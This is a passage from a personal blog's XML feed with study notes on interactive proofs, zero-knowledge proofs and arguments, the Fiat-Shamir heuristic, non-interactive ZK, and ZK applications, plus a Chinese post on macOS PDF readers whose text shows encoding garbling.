ofinteractive proofs, where the verifier verifies the correctness of astatement, by interacting with the prover and by using randomness. Aswas shown later by Lund, Fortnow, Karloff, Nisan, and Shamir [LFKN90,S90], interactive proofs seem to be much more powerful than standardproofs, as <strong>every language in PSPACE can be verified efficientlyvia an interactive proof, whereas only languages in NP can be verifiedefficiently via a standard proof</strong>. More specifically, [LFKN90,S90] showed that any language that can be computed in space s has aninteractive proof where the verifier runs in time poly(s,n), where n isthe instance size. Unfortunately, the running time of the prover in suchproofs is exponential in s. (In these original works the running timewas 2<sup>{O(s</sup>2)}, and this was later improved to be 2^{O(s)} by[GKR08]).</p><p>A few years after interactive proofs were introduced, Ben-Or,Goldwasser, Kilian, and Wigderson [BGKW88] introduced the notion of<strong>multi-prover interactive proofs (MIPs)</strong>. In this model,there are several provers that are proving a statement to a singlepolynomial time verifier, and the assumption is that these provers donot communicate with each other during the proof. [BGKW88] showed thatwhatever can be proved with k provers can also be proved with only twoprovers. Soon after the model of MIP was introduced, Fortnow, Rompel andSipser [FRS94] noticed that MIPs can be converted into<strong>probabilistically checkable proofs (PCPs)</strong>. (We notethat the work of [FRS94] was done before the notion of PCPs was formallydefined. However, they notice that the <strong>verifers can be replacedwith an oracle</strong>, and that given this oracle, a probabilisticverifier can efficiently decide the language.)</p><p>PCPs are proofs which can be verified by a probabilistic verifier byreading only a few bits of the proof.</p><p>Two element have been added to the notion of proof:<strong>probabilistic and interactive</strong>. You are willing toaccept that small statement with the small probability of error and thenotion of interaction. So here we have interactive proof, PCPs,MIPsï¼ˆcan only need two proversï¼‰. However, there three approach are notpractical (for cloud computation delegation). Interactive proofs canonly be applied to LOG SPACE languages. In addition, the resulting proofhas many rounds of interaction. PCPs requires the verifier to store theentire PCP, and in many settings the verifier is space bounded andcannot store such a long string. Using MIPs requires the existence oftwo clouds that do not interact with each other, and we prefer not tomake such an assumption, since our starting point is that we do nottrust the cloud, and hence do not trust that the clouds will notinteract.</p><p>Cryptographic assumptions empowers ZK. However, the resultingprotocols are <strong>not (interactive) proofs</strong>, as they do notsatisfy the usual soundness condition, but rather satisfy a weakenedversion: The requirement is that only computationally bounded cheatingprovers cannot convince the verifier of the validity of incorrectstatements (whereas an all powerful adversary may be able to cheat). Aprotocol that satisfies such a computational soundness condition iscalled an <strong>interactive argument</strong>(as opposed to aninteractive proof), a notion that was introduced by Brassard, Chaum andCrepeau [BCC88]. The motivation behind such a definition is the beliefthat in real life adversaries are not all powerful.</p></li></ol><h2 id="arguments-and-proofs-of-knowledge">arguments and proofs ofknowledge</h2><p>From the discrete math, it can be known that an argument is a list ofstatements called premises followed by a statement called theconclusion. (We allow the list of premises to be empty). We say that anargument is valid if the conjunction of its premises implies itsconclusion. In other words, validity means that if all the premises aretrue, then so is the conclusion. Validity of an argument does notguarantee the truth of its premises, so does not guarantee the truth ofits conclusion. <strong>The validity of an argument only guarantees thatthe conclusion will be true if the premises are.</strong></p><p>Due to the following three reasons, <strong>an alternative way ofshowing that an argument is valid, called a proof</strong>, isproposed</p><p>First, the truth table can get quite large. Second, checking thevalidity of an argument mechanically by constructing a truth table isalmost completely unenlightening Lastly, while truth tables suffice tocheck the validity of statements in the propositional calculus, they donot work for the predicate calculus</p><p>A proof is an argument that applies one or more: sound reasoningmethods.</p><p><strong>Proofs</strong>: A proof of an argument is a list ofstatements, each of which is obtained from the preceding statementsusing one of the rules of inference T1, T2, S, C, or P. The laststatement in the proof must be the conclusion of the argument.</p><p>Q: What does a proof actually have to do with the validity of anargument? A: On the one hand, a proof establishes the validity of anargument. A proof does show that an argument is valid. Every validargument in propositional calculus has a proof. In other words, anargument is valid if and only if there is a proof of it.</p><h3 id="zk-proof-vs-zk-argument">zk proof vs zk argument</h3><p>Zero-knowledge protocols come in several flavors, depending on howone formulates the two security conditions:</p><ol type="1"><li><p>the zero-knowledge condition, which says that the verifierâ€œlearns nothingâ€ other than the fact the assertion being proven istrue,</p><p>In statistical zero knowledge, the zero-knowledge condition holdsregardless of the computational resources the verifier invests intotrying to learn something from the inter-action. In computational zeroknowledge, we only require that a probabilistic polynomial-time verifierlearn nothing from the interaction.</p></li><li><p>the soundness conditions, which says that the prover cannotconvince the verifier of a false assertion.</p><p>Similarly, for soundness, we have statistical soundness, a.k.a. proofsystems, where even a computationally unbounded prover cannot convincethe verifier of a false statement (except with negligible probability),and computational soundness, a.k.a. argument systems [BCC88], where weonly require that a polynomial-time prover cannot convince the verifierof a false statement.</p></li></ol><p>It is useful to distinguish between zero-knowledge proofs, withstatistical soundness, and zero-knowledge arguments with computationalsoundness. In general, proofs can only have computationalzero-knowledge, while arguments may have perfect zero-knowledge.</p><p>In a proof, the soundness holds against a computationally unboundedprover and in an argument, the soundness only holds against apolynomially bounded prover. Arguments are thus often called"computationally sound proofs". A zero knowledge argument is just a zeroknowledge proof that has computational soundness rather than statisticalsoundness.</p><p>It's worth noting that the terms are often used interchangeably inrecent literature. Papers may still uses "proof" to mean "argument"</p><h2 id="references">References</h2><ol type="1"><li><ahref="https://github.com/sec-bit/learning-zkp/blob/master/zkp-intro/1/zkp-back.md">åˆè¯†ã€Œé›¶çŸ¥è¯†ã€ä¸ã€Œè¯æ˜ã€</a></li><li><ahref="https://windowsontheory.org/2012/09/18/the-evolution-of-proofs/">TheEvolution of Proofs â€“ Windows On Theory</a></li><li><ahref="https://crypto.stackexchange.com/questions/34757/what-is-the-difference-between-proofs-and-arguments-of-knowledge">soundness- what is the difference between proofs and arguments of knowledge? -Cryptography Stack Exchange</a></li><li><ahref="https://www.zweigmedia.com/RealWorld/logic/logic6.html#:~:text=On%20the%20one%20hand%2C%20a,that%20an%20argument%20is%20valid.">6.Arguments and Proofs</a></li><li>ã€Šé€»è¾‘çš„å¼•æ“ã€‹</li><li><ahref="http://people.seas.harvard.edu/~salil/research/SZKargs-focs.pdf">SZKargs-focs.pdf</a></li><li>[BCC88] Gilles Brassard, David Chaum, Claude CrÃ©peau: MinimumDisclosure Proofs of Knowledge. J. Comput. Syst. Sci. 37(2): 156-189(1988).</li><li><ahref="https://www.youtube.com/watch?v=6uGimDYZPMw&amp;list=PL8Vt-7cSFnw29cLUVqAIuMlg1QJ-szV0K&amp;index=3">Introductionto Zero Knowledge - Alon Rosen - YouTube</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Fiat-Shamir heuristic and Non-interactive Proof</title>
      <link href="/blog/2023/03/20/crypto/zk/2.fiatshamir_nizk/"/>
      <url>/blog/2023/03/20/crypto/zk/2.fiatshamir_nizk/</url>
      
        <content type="html"><![CDATA[<h1 id="fiat-shamir-heuristic-and-non-interactive-proof">Fiat-Shamirheuristic and Non-interactive Proof</h1><h2 id="what-is-heuristic">what is heuristic</h2><p>heuristic (from Greek Îµá½‘ÏÎ¯ÏƒÎºÏ‰ "I find, discover"): The use ofexperience and practical efforts to find answers to questions or toimprove performance -- Longman dictionary about "heuristic"</p><blockquote><p>In mathematical optimization and computer science, heuristic (fromGreek Îµá½‘ÏÎ¯ÏƒÎºÏ‰ "I find, discover") is a technique designed for solving aproblem more quickly when classic methods are too slow for finding anapproximate solution, or when classic methods fail to find any exactsolution. This is achieved by trading optimality, completeness,accuracy, or precision for speed. In a way, it can be considered ashortcut. Nevertheless, heuristics is a widely used technique for avariety of reasons:</p><ol type="1"><li>Problems that do not have an exact solution or for which theformulation is unknown</li><li>The computation of a problem is computationally intensive</li><li>Calculation of bounds on the optimal solution in branch and boundsolution processes</li></ol></blockquote><p>Examples that employ heuristics include using trial and error, a ruleof thumb or an educated guess.</p><p>Heuristics are the strategies derived from previous experiences withsimilar problems. These strategies depend on using readily accessible,though loosely applicable, information to control problem solving inhuman beings, machines and abstract issues. When an individual applies aheuristic in practice, it generally performs as expected. However it canalternatively create systematic errors.</p><p>äººåœ¨è§£å†³é—®é¢˜æ—¶æ‰€é‡‡å–çš„ä¸€ç§æ ¹æ®ç»éªŒè§„åˆ™è¿›è¡Œå‘ç°çš„æ–¹æ³•ã€‚å…¶ç‰¹ç‚¹æ˜¯åœ¨è§£å†³é—®é¢˜æ—¶,åˆ©ç”¨è¿‡å»çš„ç»éªŒ,é€‰æ‹©å·²ç»è¡Œä¹‹æœ‰æ•ˆçš„æ–¹æ³•ï¼Œè€Œä¸æ˜¯ç³»ç»Ÿåœ°ã€ä»¥ç¡®å®šçš„æ­¥éª¤å»å¯»æ±‚ç­”æ¡ˆã€‚å¯å‘å¼è§£å†³é—®é¢˜çš„æ–¹æ³•æ˜¯ä¸ç®—æ³•ç›¸å¯¹ç«‹çš„ã€‚ç®—æ³•æ˜¯æŠŠå„ç§å¯èƒ½æ€§éƒ½ä¸€ä¸€è¿›è¡Œå°è¯•ï¼Œæœ€ç»ˆèƒ½æ‰¾åˆ°é—®é¢˜çš„ç­”æ¡ˆï¼Œä½†å®ƒæ˜¯åœ¨å¾ˆå¤§çš„é—®é¢˜ç©ºé—´å†…ï¼ŒèŠ±è´¹å¤§é‡çš„æ—¶é—´å’Œç²¾åŠ›æ‰èƒ½æ±‚å¾—ç­”æ¡ˆã€‚å¯å‘å¼æ–¹æ³•åˆ™æ˜¯åœ¨æœ‰é™çš„æœç´¢ç©ºé—´å†…,å¯æ¥å—çš„è®¡ç®—æˆæœ¬å†…ï¼Œå¤§å¤§å‡å°‘å°è¯•çš„æ•°é‡ï¼Œèƒ½è¿…é€Ÿåœ°è¾¾åˆ°é—®é¢˜çš„è§£å†³ã€‚ä½†ç”±äºè¿™ç§æ–¹æ³•å…·æœ‰å°è¯•é”™è¯¯çš„ç‰¹ç‚¹ï¼Œæ‰€ä»¥ä¸ä¸€å®šèƒ½ä¿è¯æ‰€å¾—çš„å¯è¡Œè§£å’Œæœ€ä¼˜è§£,ä¹Ÿå°±æ˜¯è¯´æœ‰å¤±è´¥çš„å¯èƒ½æ€§,ç”šè‡³åœ¨å¤šæ•°æƒ…å†µä¸‹ï¼Œæ— æ³•é˜è¿°æ‰€å¾—è§£åŒæœ€ä¼˜è§£çš„è¿‘ä¼¼ç¨‹åº¦ã€‚å› ä¸ºå¯å‘å¼ç®—æ³•ç°åœ¨è¿˜æ²¡æœ‰å®Œå¤‡çš„ç†è®ºä½“ç³»ï¼Œåªèƒ½è§†ä½œä¸€ç§æŠ€æœ¯ã€‚ç§‘å­¦å®¶çš„è®¸å¤šé‡å¤§å‘ç°ï¼Œå¸¸å¸¸æ˜¯åˆ©ç”¨æä¸ºç®€å•çš„å¯å‘å¼è§„åˆ™ã€‚</p><p>åˆ©ç”¨å¯å‘å¼ç®—æ³•è¿›è¡Œç›®æ ‡ä¼˜åŒ–çš„ä¸€äº›ä¼˜ç¼ºç‚¹å¦‚ä¸‹ï¼š</p><table><colgroup><col style="width: 49%" /><col style="width: 50%" /></colgroup><thead><tr class="header"><th>ä¼˜ç‚¹</th><th>ç¼ºç‚¹</th></tr></thead><tbody><tr class="odd"><td>1. ç®—æ³•ç®€å•ç›´è§‚ï¼Œæ˜“äºä¿®æ”¹ <br> 2.ç®—æ³•èƒ½å¤Ÿåœ¨å¯æ¥å—çš„æ—¶é—´å†…ç»™å‡ºä¸€ä¸ªè¾ƒä¼˜è§£</td><td>1. ä¸èƒ½ä¿è¯ä¸ºå…¨å±€æœ€ä¼˜è§£ <br>2.ç®—æ³•ä¸ç¨³å®šï¼Œæ€§èƒ½å–å†³äºå…·ä½“é—®é¢˜å’Œè®¾è®¡è€…ç»éªŒ</td></tr></tbody></table><h2 id="fiat-shamir-heuristic">Fiat-Shamir heuristic</h2><p>The initial idea of Fiat and Shamir was to eliminate the interactionin public coin protocols (note that public coin means that the randomchoices of the verifier are made public) and was used to convert threesteps public coin identification scheme into conceptually simplesignature schemes (it has later been proven by Pointcheval and Sternthat under the random oracle model such signature schemes provideexistential unforgeability under chosen message attacks).</p><p>If you apply the Fiat-Shamir heuristic to interactive zero-knowledgeproofs you</p><ol type="1"><li><p>firstly collapse the protocol rounds which all the smallchallenge space of <span class="math inline">\(\{0,1\}\)</span> into oneround using a larger challenge space (e.g., <spanclass="math inline">\(â„¤ğ•¡\)</span>, where the size of the message spacecontrols the soundness error) at the cost of only being honest-verifierzero-knowledge, and</p></li><li><p>secondly you do not longer let the verifier sample the challenge(public coins), but compute the challenge as output of a hash functionwith input the previous protocol messages. The hash function is modelledas a random oracle (outputs random strings that are not distinguishablefrom truly random strings), which models the unpredictability of theverifier.</p></li></ol><h2 id="non-interactive-proof">Non-interactive Proof</h2><p>In very simplified terms, a NI-ZK proof works in 2 stages: First, yourun the protocol with a simulator (who is just a verifier, but therandom choices are done differently), and then you can give thetranscript of the protocol to anyone and convince them that the proof isreal.</p><p>Two important ways to convert an interactive protocol to anon-interactive proof:</p><ol type="1"><li><p>In the random oracle model (assuming that you have access toideal hash functions), you can use the Fiat Shamir heuristic: Youreplace the verifier with a simulator, and whenever the verifier wouldhave to choose randomly, you use the hash function over the entireprotocol so far (most importantly, the commitments of the prover) toemulate a random unpredictable choice. Since the hash function isdeterministic, you can't change the value without changing the previousinteractions. When you're done with the protocol, you can just take thetranscript and give it to someone. However, there is a tradeoff in thesecurity level: If the prover is able to cheat with a certainprobability, then he could just try different commitments if he doesn'tlike the result of the hash function. So in order to get e.g. an errorof less than 1/280, you would need an error probability of less than1/2160 with the hash function replacing true random choices. (And thisis why it's called a heuristic, there is no proof for this)</p></li><li><p>With a common reference string you can achieve NI-ZK. The commonreference string is a random string of symbols, which is drawn from someprobability distribution. The assumption is, that these random valuesare available to all parties, but no party has any influence on theiractual choice. And if you simulate the ZK proof with the random choicesaccording to the common reference string, you should get the same resultas anyone else validating the protocol transcript. I believe you don'thave to double the security parameter in this case (like for FiatShamir), but on the other hand a common reference string is harder torealize than a hash function.</p></li></ol><h3 id="crs-model-vs-rom-model">CRS model vs ROM model</h3><p>The main difference between the ROM and CRS model is that proofs inthe ROM are heuristic, since the actual protocol instantiation uses ahash function that is blatantly NOT a random oracle. In contrast, proofsin <strong>the CRS model have a standard reduction-based proof ofsecurity</strong>, and so are not heuristic.</p><p>The main advantage of the CRS model over the random oracle model isthat security is standard, and doesn't rely on a heuristic belief systemthat the real protocol that uses a standard hash function is secure. Themain disadvantage is that you need to somehow generate this CRS, andthis isn't trivial if there's no trust. Zcash uses a CRS and ran a largeMPC protocol between many parties to generate the CRS. As long as youbelieve that not all the participants colluded, then you can trust thesystem from that point on. This is a good example of where a CRS can bedeployed in reality.</p><p>The CRS model achieves its function by incorporating hidden secrets.The reference string must have some structure based on secret randomcoins (e.g., be of the form Gs, Gs2, Gs3, . . .) and the secret(e.g.,the value s) must be discarded after generation. This makes CRSgeneration an inherently trusted process.</p><h2 id="å‚è€ƒ">å‚è€ƒ</h2><ol type="1"><li><ahref="https://www.ldoceonline.com/dictionary/heuristics">heuristics |meaning of heuristics in Longman Dictionary of Contemporary English |LDOCE</a></li><li><ahref="https://optimization.cbe.cornell.edu/index.php?title=Heuristic_algorithms">Heuristicalgorithms - Cornell University Computational Optimization Open Textbook- Optimization Wiki</a></li><li><ahref="https://en.wikipedia.org/wiki/Heuristic_%28computer_science%29">Heuristic(computer science) - Wikipedia</a></li><li><a href="https://en.wikipedia.org/wiki/Heuristic">Heuristic -Wikipedia</a></li><li><ahref="https://www.jianshu.com/p/0694c59aae3a">å¯å‘å¼ç®—æ³•ï¼ˆHeuristicAlgorithmï¼‰ - ç®€ä¹¦</a></li><li><ahref="https://leovan.me/cn/2019/04/heuristic-algorithms/#fn:1">å¯å‘å¼ç®—æ³•(Heuristic Algorithms) - èŒƒå¶äº® | Leo Van</a></li><li><ahref="https://crypto.stackexchange.com/questions/20727/explanation-of-the-fiat-shamir-heuristic">signature- Explanation of the Fiat-Shamir heuristic - Cryptography StackExchange</a></li><li><a href="https://crypto.stackexchange.com/a/14368">Answer 2 - Whatis a Non-Interactive Zero Knowledge Proof? - Cryptography StackExchange</a></li><li><ahref="https://crypto.stackexchange.com/questions/58558/what-is-the-common-reference-string-crs-model">hash- What is the Common Reference String (CRS) model - Cryptography StackExchange</a></li><li><a href="https://eprint.iacr.org/2018/280.pdf">Updatable andUniversal Common Reference Strings with Applications tozk-SNARKs</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ZK Application</title>
      <link href="/blog/2023/03/18/crypto/zk/1.zk_application/"/>
      <url>/blog/2023/03/18/crypto/zk/1.zk_application/</url>
      
        <content type="html"><![CDATA[<h1 id="zk-application">zk Application</h1><p>The concept and application of zk is evolving fast. It was good touse zk to achieve linear regression before, but now we have to use zk todo neural networks and social graphs, etc.</p><p>Two properties: privacy preservation and scalability, besides zk canensure the trust of data and computation.</p><h2 id="privacy">privacy</h2><ol type="1"><li><p>Proof of membershipï¼Œfrom membership proof of set to the merkletree proof recently more efficient proof than merkle proof is proposedï¼š<a href="https://eprint.iacr.org/2022/621">Caulk: Lookup Arguments inSublinear Time</a></p></li><li><p>Holding centralized parties accountable</p><p>The centralized server proves the correctness of the aggregationoperation and generates a zero-knowledge proof.</p><p>For example: The <ahref="https://github.com/privacy-scaling-explorations/maci">maci:Minimal anti collision infrastructure</a> coercion-resistant votingsystem. Voters submit votes encrypted with the key of a centraloperator, The operator in All votes are decrypted on the chain, and thencounted to reveal the final result. In addition, it is necessary toprove that they are indeed counted normally through zk-SNARK. Thisadditional complexity is a necessary overhead to ensure strong privacyproperties,</p></li><li><p>Combining ZK-SNARKs with MPC</p><p>generate proof for inputs from multi-party, while protecting theprivacy of each party.</p><p>A more advanced use of ZK-SNARKs involves making proofs overcomputations where the inputs are split between two or more parties, andwe don't want each party to learn the other parties' inputs. You cansatisfy the privacy requirement with garbled circuits in the 2-partycase, and more complicated multi-party computation protocols in theN-party case. ZK-SNARKs can be combined with these protocols to doverifiable multi-party computation.</p><p>This could enable more advanced reputation systems where multipleparticipants can perform joint computations over their private inputs,it could enable privacy-preserving but authenticated data markets, andmany other applications. That said, note that the math for doing thisefficiently is still relatively in its infancy.</p></li><li><p>ZKPs can be used to preserve data privacy in areas such as healthcare, communications, finance and civic tech.</p><ol type="1"><li><p>An interesting use case in finance is a proposal from ING toprove that a number is within a specific range without revealing thatnumber.</p><p>The Dutch bank ING has built a variation of this concept called â€œZeroKnowledge Range Proofâ€œ. The system is designed to prove that a number iswithin a given range, without revealing the value of number. ING'sblockchain team notes that this can be used for instance to verify ifyour salary is sufficient to get a loan, without actually revealing howmuch you make.</p></li><li><p>The AdEx Network allows for decentralized, ZKP advertisementauctions in which a user can bid for the price of placing an ad withoutrevealing what that price is to other users.</p></li><li><p>Z-Cash, a cryptocurrency that allows for privatetransactions.</p></li></ol></li><li><p>blockchain with zk</p><p>blockcahin provide the censorship resistance, transaction guaranteedexecution and other guarantees, but with two costs, scalability andprivacy. Luckily, the two property, zero-knowledge, succinct of ZK-SNARKcan make it up exactly.</p><p>There are social connections and interactions between the accounts ofthe blockcahin, which can explore using historical data.</p><p>Explore ways to make proofs about this kind of shared network. Forinstance, I can prove with a group of people that there are two stepsbetween me and a person in the social graph.</p></li><li><p>interoperability application</p><p>Just like applications can be divided into scalability applicationand privacy application, zk may bring another category:<strong>interoperability application</strong>. For example, thesignature of github commit, rsa signature and authentication, etc., zkcan generalize the unique signatures of these different platforms andbecome interactive, for example: rsa signature can only be verified bythe other party running rsa verfication, but zk can implemente that:Include the rsa private key to the github account, or claim to have theecdsa private key of the Ethereum account.</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ZK introduction</title>
      <link href="/blog/2023/03/16/crypto/zk/0.zk_intro/"/>
      <url>/blog/2023/03/16/crypto/zk/0.zk_intro/</url>
      
        <content type="html"><![CDATA[<h1 id="zk-introduction">ZK introduction</h1><h2 id="zk-theory-basis-and-developments">ZK theory basis anddevelopments</h2><h3 id="theory-basis">Theory basis</h3><p>Zero knowledge Proof is composed of Mathematical Logicï¼ˆmainlycomplexity and a few proof theoryï¼‰and Cryptography.</p><p>For proof theroy, if logic is the science of valid inference, thenproofs embody its heart. There are two properties for the proof system,Soundness and Completeness.</p><ul><li>Given a certain proof system, the soundness theorem says that onlyvalid sentences are provable in it.</li><li>The completeness theorem says that every valid sentence is provablein it.</li></ul><p>zero knowledge proof doesn't give you an a right proof. It's aboutminimizing the probability that someone is lying to you.</p><h2 id="principles">Principles</h2><p>Suppose that you have a public input <spanclass="math inline">\(x\)</span>, a private input <spanclass="math inline">\(w\)</span>, and a (public) function <spanclass="math inline">\(f(x,w)-&gt;\{True, False\}\)</span>, whichperforms some kind of verification on the inputs. With a ZK-SNARK, youcan prove that for some given <span class="math inline">\(f\)</span> and<span class="math inline">\(x\)</span>, you know the an <spanclass="math inline">\(w\)</span> such that <spanclass="math inline">\(f(x,w) = True\)</span>, without revealing what<span class="math inline">\(w\)</span> is. Additionally, the verifiercan verify the proof much fast than computate <spanclass="math inline">\(f(x,w)\)</span> themselves directly, even if theykonw <span class="math inline">\(w\)</span>.</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16827573823310.jpg"alt="zk principle" /><figcaption aria-hidden="true">zk principle</figcaption></figure><p>Three properties:</p><ol type="1"><li><strong>Completeness</strong>: it should convince the verifier thatthe prover knows what they say they know</li><li><strong>Soundness</strong>: if the information is false, it cannotconvince the verifier that the proverâ€™s information is true</li><li><strong>Zero-knowledge</strong>: it should reveal nothing else tothe verifier</li></ol><p>If verifier accepts, then it learns no additional information fromthe interaction, because <span class="math inline">\(verifier^*\)</span>could have simulated the entire dialog or interaction on his own.</p><blockquote><p><span class="math inline">\(verifier^*\)</span>: any verifier thateven deviates from the prescribed instruction of the protocol.</p></blockquote><h2 id="zk-snarks">ZK-SNARKs</h2><p>Zero-Knowledge Succinct Non-interactive ARguments of Knowledge, atype of non-interactive ZKP</p><p>Zero-Knowledge, because they donâ€™t reveal any knowledge to theverifier succinct, because the proof can be verified quickly noninteractive, because repeated interaction is not required between proverand verifier and arguments of knowledge, because they present soundproof.</p><h2 id="drawbacks">Drawbacks</h2><ol type="1"><li>It can't produce a 100% airtight proof. It can only infinitelyreduce the probability that someone is faking a proof.</li><li>The algorithm is rather intensive, requiring either a large numberof interactions between verifier and prover or, in case of SNARK's,requiring a lot of computations that could make it impossible to run onslow or mobile devices. But that limitation can be overcome. The Zcashteam for instance has been at hard at work to improve their algorithm soit can also run on lower powered devices such as a smartphone.</li></ol><h2 id="developments">Developments</h2><p>zkp is first proposed in a paper from 1985 called â€œThe KnowledgeComplexity of Interactive Proof-Systens. It develops fromnon-interactive form to interactive form.</p><ul><li><p>interactive proof: The claimed statement is verifiedprobabilistically by by utilizing a computational hard problem(<strong>NP-hard problem</strong>), a challenge-response protocol(<strong>randomness</strong>), and interactivity.</p></li><li><p>non-interactive proof: The verifier is replaced with a simulator,and the randomness challenge and interactivity can be achieved by twoways to hidden randomness,random oracle model (ROM) and common referencestring model (CRS).</p><p>you run the protocol with a simulator (who is just a verifier, butthe random choices are done differently), and then you can give thetranscript of the protocol to anyone and convince them that the proof isreal. Therefore, the proof is actually the transcript of the protocolbetween prover and the simulator (verifier). The verification processinvolves verifying whether the transcript is correct or not.</p></li></ul><h2 id="reference">Reference</h2><ol type="1"><li><ahref="https://blog.cambridgecoaching.com/what-are-the-soundness-and-completeness-theorems-in-logic-all-about">CC| What are the soundness and completeness theorems in logic allabout?</a></li><li><ahref="https://vitalik.ca/general/2022/06/15/using_snarks.html">Some waysto use ZK-SNARKs for privacy</a></li><li><ahref="https://www3.cs.stonybrook.edu/~pfodor/courses/CSE371/slides07/7slides.pdf">Chapter7: Proof Systems: Soundness and Completeness</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>macOS æœ€ä½³ pdf é˜…è¯»å™¨</title>
      <link href="/blog/2023/03/16/linux/macos/mac_pdf/"/>
      <url>/blog/2023/03/16/linux/macos/mac_pdf/</url>
      
        <content type="html"><![CDATA[<ol type="1"><li><p>macOS è‡ªå¸¦çš„ preview æŸ¥çœ‹ pdf å’Œåˆå¹¶åˆ é™¤ pdfé¡µæŒºåˆé€‚ï¼Œä½†æ˜¯é«˜äº®å’Œç¬”è®°æ—¶ä¸æ—¶ä¼šä¸¢å¤±</p></li><li><p>æœ€è¿‘åœ¨ MacOS ä¸Šä½¿ç”¨ç¦æ˜•é˜…è¯»å™¨ï¼Œé«˜äº®ç­‰ä¸€äº› PDFç¼–è¾‘å™¨åº”æœ‰çš„ç‰¹æ€§æ— æ³•ä½¿ç”¨ macOS è§¦æ§æ¿å®ç°ï¼Œå› æ­¤æ¢ä¸Šäº†å¤§åé¼é¼çš„ AdobeAcrobatã€‚</p><ol type="1"><li><p>Adobe Acrobat æ¯æ¬¡éƒ½å¼¹çª—ä»€ä¹ˆ read the entiredocumentï¼Œè€Œä¸”æ»šåŠ¨é¡µé¢æ˜¾ç¤ºä¹Ÿå¾ˆæœ‰é—®é¢˜ï¼ŒæŸ¥äº†æŸ¥æ˜¯ accessibilityæ’ä»¶çš„é—®é¢˜ï¼Œè§£å†³åŠæ³•ï¼š</p></li><li><p>åœ¨ Applications é‡Œé¢è¿›å…¥ adobe acrobat çš„æ–‡ä»¶å¤¹ contentä¸­ï¼Œç„¶åè¿›å…¥ Plugins æ–‡ä»¶å¤¹ï¼Œå°†å…¶ <code>Accessibility.acroplugin</code>æ›´åä¸ºä¸€ä¸ªåˆ«çš„åå­—ï¼Œè®©è½¯ä»¶æ— æ³•ä½¿ç”¨å³å¯ã€‚</p></li></ol><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd Adobe\ Acrobat\ DC/Adobe\ Acrobat.app/Contents/Plugins/Accessibility.acroplugin</span><br></pre></td></tr></table></figure></p><ol start="2" type="1"><li>â€œå¦‚æœ PDF æ–‡ä»¶åŒ…å«è§†å›¾å±æ€§ï¼ŒAdobe Acrobat ä¼šé»˜è®¤è¯»å–ä¸Šæ¬¡è¿™ä¸ª PDFæ–‡ä»¶çš„è§†å›¾è®¾ç½®ã€‚å¦‚æœæ°å·§ä¸Šæ¬¡ä½ æ˜¯é‡‡ç”¨å•é¡µæ¨¡å¼æŸ¥çœ‹ï¼Œå°±ä¼šå‡ºç°é¼ æ ‡æ»šè½®ç¿»é¡µæ…¢çš„æƒ…å†µã€‚å¯ä»¥é€šè¿‡èœå•æ›´æ”¹ä¸ºå•é¡µè¿ç»­æ¨¡å¼ï¼Œé¼ æ ‡æ»šè½®å°±æ¢å¤æ­£å¸¸äº†ã€‚</li></ol><p>æ“ä½œæ–¹æ³•ï¼šè§†å›¾â€”â€”é¡µé¢æ˜¾ç¤ºâ€”â€”å•é¡µè¿ç»­ï¼Œ ä¹Ÿå¯ä»¥å¯¹é½è®¾ç½®é»˜è®¤å•é¡µè¿ç»­</p></li></ol><p>æœ€è¿‘ä½¿ç”¨ pdf æ ‡æ³¨åŠŸèƒ½ï¼Œä½¿ç”¨è½»é‡çº§ pdf é˜…è¯»å™¨ skimï¼Œç„¶åæ‰¹æ³¨åªæœ‰åœ¨skim ä¸Šçœ‹å¾—åˆ°ï¼Œåˆ«çš„ pdf é˜…è¯»å™¨æ‰“å¼€çœ‹ä¸åˆ°æ‰¹æ³¨ï¼Œè¿˜æ˜¯ Adobe Acrobatï¼Œ pdfexpert ç­‰é‡é‡çº§çš„ pdf é˜…è¯»ç¼–è¾‘å™¨å¥½ç”¨</p><h2 id="ç»“è®º">ç»“è®º</h2><p>macOS è¿˜æ˜¯è¦ä¹°å†…å­˜å¤§ä¸€ç‚¹ï¼Œä¹°ä¸ª 24g+ çš„å†…å­˜ï¼Œæ»¡è¶³ï¼š</p><ol type="1"><li>å¤šå¼€ pdf ï¼ˆpdf å å†…å­˜æ˜¯çœŸçš„å¤§ï¼‰ï¼›</li><li>ç”¨ parallel desktop å¼€ windows ç”¨ visio ç”»å›¾ï¼›</li><li>å¼€ç€ vscode å†™ LaTeX çš„ä¹ æƒ¯ï¼›</li><li>vscode æœ¬åœ°æˆ–è¿œç¨‹æ•²ä»£ç ä¸è°ƒæ•´å®éªŒç»“æœå›¾ç‰‡ï¼›</li><li>è‡³å°‘å®‰è£… Adobe Acrobat åŠŸèƒ½æœ€å…¨ï¼Œpdf expert ä¹Ÿå¯ã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> macos </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MPI4py ä½¿ç”¨æ€»ç»“</title>
      <link href="/blog/2023/03/15/programming/python/mpi4py/"/>
      <url>/blog/2023/03/15/programming/python/mpi4py/</url>
      
